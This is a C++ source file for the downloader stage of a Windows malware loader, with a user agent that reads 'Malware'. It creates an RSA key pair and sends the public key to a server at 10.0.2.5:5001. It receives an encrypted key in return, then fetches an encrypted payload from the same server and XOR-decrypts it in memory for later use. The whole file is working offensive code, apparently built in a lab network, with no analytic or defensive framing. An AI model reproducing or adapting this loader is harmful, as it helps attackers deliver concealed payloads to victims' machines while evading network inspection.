#include "Winhttp-Request.h"

void xor_decrypt(unsigned char* result, size_t data_len, unsigned char* key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        result[i] ^= key[i % key_len];
    }
}

EncryptedData getPayload()
{
    BYTE* pbFinalEncryptedData = nullptr;
    DWORD dwTotalDataLen = 0;
    EncryptedData result = { nullptr, 0 };

    // Create a RSA key pair.
    HCRYPTPROV hCryptProv;
    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_MACHINE_KEYSET)) {
        if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_MACHINE_KEYSET | CRYPT_NEWKEYSET)) {
            return { nullptr, 0 };
        }
    }

   HCRYPTKEY hKey;
    if (!CryptGenKey(hCryptProv, AT_KEYEXCHANGE, CRYPT_EXPORTABLE, &hKey)) {
        return { nullptr, 0 };
    }

    // Export the public key.
    BYTE* pbPublicKeyBlob = NULL;
    DWORD dwPublicKeyBlobLength = 0;

    if (!CryptExportKey(hKey, NULL, PUBLICKEYBLOB, 0, NULL, &dwPublicKeyBlobLength)) {
        return { nullptr, 0 };
    }

    pbPublicKeyBlob = new BYTE[dwPublicKeyBlobLength];
    if (!CryptExportKey(hKey, NULL, PUBLICKEYBLOB, 0, pbPublicKeyBlob, &dwPublicKeyBlobLength)) {
        return { nullptr, 0 };
    }

    //// Display the public key.
    /*printf("Public key: ");
    for (DWORD i = 0; i < dwPublicKeyBlobLength; i++) {
        printf("%02x", pbPublicKeyBlob[i]);
    }
    printf("\n");*/

    HINTERNET hSession = WinHttpOpen(L"Malware",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, L"10.0.2.5", 5001, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/payload/2", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    printf("[*] Sending request...\n");
    // Send a request with the public key.
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)pbPublicKeyBlob, dwPublicKeyBlobLength, dwPublicKeyBlobLength, 0)) {
        printf("Error %u WinHttpSendRequest.\n", GetLastError());
        return { nullptr, 0 };
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        printf("Error %u WinHttpReceiveResponse.\n", GetLastError());
        return { nullptr, 0 };
    }


    printf("[*] Receiving...\n");

    DWORD dwAESKeyDataLen = 0;
    DWORD dwAESKeyDataLenBackup = 0;
    LPSTR pbAESKeyData = NULL;
    LPSTR pbAESKeyDataBackup = NULL;
    DWORD dwDownloaded = 0;
    do {
        // Allocate memory to store the encrypted message. 
        dwAESKeyDataLen = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwAESKeyDataLen))
            printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());

        pbAESKeyData = new char[dwAESKeyDataLen + 1];
        pbAESKeyDataBackup = new char[dwAESKeyDataLen + 1];


        if (!pbAESKeyData) {
            printf("Error allocating memory for the buffer.\n");
            dwAESKeyDataLen = 0;
        }
        else {
            // Read the data.
            ZeroMemory(pbAESKeyData, dwAESKeyDataLen + 1);
            if (!WinHttpReadData(hRequest, (LPVOID)pbAESKeyData, dwAESKeyDataLen, &dwDownloaded)) {
                printf("Error %u in WinHttpReadData.\n", GetLastError());
                return { nullptr, 0 };
            }
            else {
                // Store the encrypted data
                printf("%s", pbAESKeyData);
                /*LPSTR pbEncryptedDataBackup = pbEncryptedData;
                DWORD dwEncryptedDataLenBackup = dwEncryptedDataLen;
                int numberOfBlock = (dwEncryptedDataLen + 64 - 1) / 64;

                DWORD dwBlockLen = 0;
                DWORD dwBlockLenSize = sizeof(DWORD);

                // Retrieve the block length of the RSA key.
                if (CryptGetKeyParam(hKey, KP_PADDING, (BYTE*)&dwBlockLen, &dwBlockLenSize, 0)) {
                    printf("Block length of the RSA key: %d bits\n", dwBlockLen);
                }
                else {
                    printf("CryptGetKeyParam failed: %x\n", GetLastError());
                }
                  
                // Decrypt the message.
                for (int i = 0; i < numberOfBlock; i++) {
                    BOOL is_final_block = false;    
                    
                    if (i+1 == numberOfBlock) {
                        is_final_block = true;
                    }

                    if (!CryptDecrypt(hKey, NULL, is_final_block, 0, (BYTE*)pbEncryptedData, &dwEncryptedDataLen)) {
                        printf("Error %u in CryptDecrypt.\n", GetLastError());
                        return { nullptr, 0 };
                    }
                    pbEncryptedData += 64;
                    dwEncryptedDataLen = dwEncryptedDataLenBackup;

                }

                printf("Decrypted message: ");
                for (DWORD i = 0; i < dwEncryptedDataLenBackup; i++) {
                    printf("%c", pbEncryptedData[i]);
                }
                printf("\n");
                */

                if (!CryptDecrypt(hKey, 0, true, 0, (BYTE*)pbAESKeyData, &dwAESKeyDataLen)) {
					printf("Error %u in CryptDecrypt.\n", GetLastError());
					return { nullptr, 0 };
				}

                // Import AES key 
                /*HCRYPTKEY hAESKey = NULL;
                if (!CryptImportKey(hCryptProv, (BYTE*)pbAESKeyData, dwAESKeyDataLen, hKey, CRYPT_OAEP, &hAESKey)) {
					printf("Error %u in CryptImportKey.\n", GetLastError());
					return { nullptr, 0 };
				}*/
                //printf("%s", pbAESKeyData);
                pbAESKeyData[dwAESKeyDataLen] = '\0';
                dwAESKeyDataLenBackup = dwAESKeyDataLen;
                //printf("%s", pbAESKeyData);

                dwAESKeyDataLen = 0;
            }

            dwTotalDataLen += dwDownloaded;
        }

        //delete[] pbPublicKeyBlob;

    } while (dwAESKeyDataLen > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    

    // Section to get the encrypted payload from the server and decrypt it with the AES key
    hSession = WinHttpOpen(L"Malware",
        		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        		WINHTTP_NO_PROXY_NAME,
        		WINHTTP_NO_PROXY_BYPASS, 0);

    hConnect = WinHttpConnect(hSession, L"10.0.2.5", 5001, 0);

    hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/payload/2", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    printf("[*] Sending request...\n");
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)) {
        printf("Error %u WinHttpSendRequest.\n", GetLastError());
        return { nullptr, 0 };
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        printf("Error %u WinHttpReceiveResponse.\n", GetLastError());
        return { nullptr, 0 };
    }
    
    DWORD dwEncryptedDataLen = 0;
    DWORD dwEncryptedDataLenBackup = 0;
    LPSTR pbEncryptedData = NULL;
    LPSTR pbEncryptedDataBackup = NULL;
    dwDownloaded = 0;
    
    do {
        // Allocate memory to store the encrypted message. 
        dwEncryptedDataLen = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwEncryptedDataLen)) {
            printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
        }

        pbEncryptedData = new char[dwEncryptedDataLen + 1];
        pbEncryptedDataBackup = new char[dwEncryptedDataLen + 1];
        
        if (!pbEncryptedData) {
            printf("Error allocating memory for the buffer.\n");
            dwEncryptedDataLen = 0;
        }
        else
        {
            // Read the data.
            ZeroMemory(pbEncryptedData, dwEncryptedDataLen + 1);
            if (!WinHttpReadData(hRequest, (LPVOID)pbEncryptedData, dwEncryptedDataLen, &dwDownloaded)) {
                printf("Error %u in WinHttpReadData.\n", GetLastError());
                return { nullptr, 0 };
            }
            else {
                printf("%s", pbEncryptedData);

                // Decrypt the message.
                xor_decrypt((unsigned char*)pbEncryptedData, (size_t)dwEncryptedDataLen, (unsigned char*)pbAESKeyData, (size_t)dwAESKeyDataLenBackup);
                dwEncryptedDataLenBackup = dwEncryptedDataLen;
                dwEncryptedDataLen = 0;
                printf("%s", pbEncryptedData);
            }
        }
    } while (dwEncryptedDataLen > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    //CryptDestroyKey(hKey);
    //CryptReleaseContext(hCryptProv, 0);
    //LPSTR pbEncryptedData = NULL;

    result.data = pbEncryptedData;
    result.size = dwEncryptedDataLenBackup;

    //printf("%s", pbEncryptedDataBackup);

    return result;
}